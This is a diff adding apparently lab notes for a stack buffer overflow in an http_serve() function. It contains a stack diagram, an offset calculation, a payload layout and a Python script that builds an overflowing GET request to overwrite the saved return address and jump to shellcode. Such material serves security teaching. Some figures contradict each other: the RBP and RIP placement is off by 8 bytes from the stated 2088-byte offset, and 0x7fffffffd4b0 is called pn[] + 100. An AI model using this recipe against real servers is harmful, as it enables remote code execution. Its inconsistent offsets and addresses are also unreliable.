@@ -1,0 +1,128 @@
+═══════════════════════════════════════════════════════════════════
+        STACK LAYOUT FOR http_serve() BUFFER OVERFLOW
+═══════════════════════════════════════════════════════════════════
+
+HIGH MEMORY ADDRESS (0x7fffffffdcd0)
+▲
+│
+│  ┌────────────────────────────────────────────────┐
+│  │  SAVED RIP (Return Address)                    │  ← 8 bytes
+│  │  Points to: process_client()                   │
+│  │  Address: 0x7fffffffdcc8                       │  ★ TARGET ★
+│  ├────────────────────────────────────────────────┤
+│  │  SAVED RBP (Frame Pointer)                     │  ← 8 bytes
+│  │  Address: 0x7fffffffdcc0                       │
+│  ├────────────────────────────────────────────────┤
+│  │  SAVED RBX Register                            │  ← 8 bytes
+│  │  Address: 0x7fffffffdcb8                       │
+│  ├────────────────────────────────────────────────┤
+│  │                                                 │
+│  │  struct stat st                                │  ← ~144 bytes
+│  │  (file metadata)                               │
+│  │                                                 │
+│  ├────────────────────────────────────────────────┤
+│  │                                                 │
+│  │  char pn[2048]                                 │  ← 2048 bytes
+│  │                                                 │  ★ OVERFLOW ★
+│  │  [0] [1] [2] ... [2047]                       │
+│  │                                                 │
+│  │  Initially: "/home/user/lab"                   │
+│  │  After strncat: "/home/user/lab/[URL_PATH]"   │
+│  │                                                 │
+│  │  Buffer starts: 0x7fffffffd4a0                 │
+│  ├────────────────────────────────────────────────┤
+│  │  void (*handler)(int, const char*)            │  ← 8 bytes
+│  │  Points to: http_serve_none                    │
+│  ├────────────────────────────────────────────────┤
+│  │  const char *name                              │  ← 8 bytes
+│  │  (pointer to URL path)                         │
+│  ├────────────────────────────────────────────────┤
+│  │  int fd                                        │  ← 4 bytes
+│  │  (socket file descriptor)                      │
+│  └────────────────────────────────────────────────┘
+│
+▼
+LOW MEMORY ADDRESS (stack grows downward)
+
+═══════════════════════════════════════════════════════════════════
+
+DISTANCE CALCULATION:
+─────────────────────
+  Saved RIP address:    0x7fffffffdcc8
+- pn[] start address:   0x7fffffffd4a0
+─────────────────────────────────────
+  Distance:             0x828 = 2088 bytes
+
+═══════════════════════════════════════════════════════════════════
+
+EXPLOIT PAYLOAD STRUCTURE:
+──────────────────────────
+
+┌─────────────────────────────────────────────────────────────────┐
+│  NOP SLED (optional)                          │  ~100 bytes     │
+├─────────────────────────────────────────────────────────────────┤
+│  SHELLCODE (if using inline injection)        │  ~50-100 bytes  │
+├─────────────────────────────────────────────────────────────────┤
+│  PADDING (fill rest of buffer + struct stat)  │  ~1930 bytes    │
+├─────────────────────────────────────────────────────────────────┤
+│  FAKE RBP (overwrite saved frame pointer)     │  8 bytes        │
+├─────────────────────────────────────────────────────────────────┤
+│  NEW RIP (address of shellcode)                │  8 bytes        │
+│  Format: \x??\x??\x??\x??\x??\x??\x??\x??     │  (little-endian)│
+└─────────────────────────────────────────────────────────────────┘
+                                    TOTAL: ~2096 bytes
+
+═══════════════════════════════════════════════════════════════════
+
+EXAMPLE PAYLOAD (in Python):
+─────────────────────────────
+
+import struct
+
+def p64(addr):
+    return struct.pack('<Q', addr)
+
+# Addresses (find these using gdb)
+pn_addr = 0x7fffffffd4a0
+shellcode_addr = pn_addr + 100  # After NOP sled
+
+# Build payload
+nop_sled = b"\x90" * 100        # NOP instructions
+shellcode = b"\xcc" * 50         # INT3 for testing
+padding = b"A" * 1938            # Fill to 2088 bytes total
+fake_rbp = b"B" * 8              # Overwrite saved RBP
+new_rip = p64(shellcode_addr)    # Point to our shellcode
+
+payload = nop_sled + shellcode + padding + fake_rbp + new_rip
+
+# Send in HTTP request
+request = b"GET /" + payload + b" HTTP/1.0\r\n\r\n"
+
+═══════════════════════════════════════════════════════════════════
+
+MEMORY STATE DURING OVERFLOW:
+──────────────────────────────
+
+BEFORE:
+  pn[]:  [/home/user/lab/][\0][unused....................][st][rbp][rip]→process_client
+
+DURING OVERFLOW:
+  pn[]:  [/home/user/lab/][NNNNN][SSSS][AAAA...AAAA][BBBB][0x...4b0]
+                          ↑NOP   ↑Shell ↑Padding    ↑RBP  ↑New RIP
+                          
+AFTER (when http_serve returns):
+  CPU jumps to: 0x7fffffffd4b0 (pn[] + 100)
+  Executes: NOP sled → Shellcode → System compromised!
+
+═══════════════════════════════════════════════════════════════════
+
+KEY INSIGHTS:
+─────────────
+1. The vulnerability is an OFF-BY-ONE error in the length check
+2. getcwd() fills pn[] with current directory first
+3. strncat() appends URL path without proper bounds checking
+4. Overflow continues upward in stack (lower to higher addresses)
+5. Saved RIP is 2088 bytes above pn[] buffer start
+6. Overwriting RIP gives control of program execution
+
+═══════════════════════════════════════════════════════════════════
